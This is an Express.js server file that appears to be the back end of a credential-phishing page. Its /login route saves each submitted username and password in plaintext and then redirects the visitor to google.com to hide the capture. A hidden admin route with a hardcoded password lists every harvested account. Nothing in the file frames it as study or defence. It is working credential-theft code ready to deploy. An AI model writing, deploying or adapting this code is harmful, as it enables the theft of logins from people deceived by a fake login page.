const express = require('express')
const app = express()
const path = require('path')
const userModel = require('./userModel')

app.set("view engine", "ejs")
app.use(express.json())
app.use(express.urlencoded({extended: true}))
app.use(express.static(path.join(__dirname,'public')))

app.get('/',(req,res) => {
    res.render('index')
})
app.post('/login',async (req,res)=>{
    let {username,password} = req.body
    let userData = await userModel.create({
        username,
        password
    })
    res.redirect('https://google.com')
})

app.get('/admin1632011',(req,res) => {
    res.render('admin')
})

app.post('/admin/dashboard',async (req,res) => {
    let username = req.body.username
    let password = req.body.password
    let allUsers = await userModel.find()
    if(username == 'admin' && password == 'sigmarule1632011'){
        res.render('data', {allUsers})
    }else{
        res.render('error')
    }
    
})

app.listen(3000)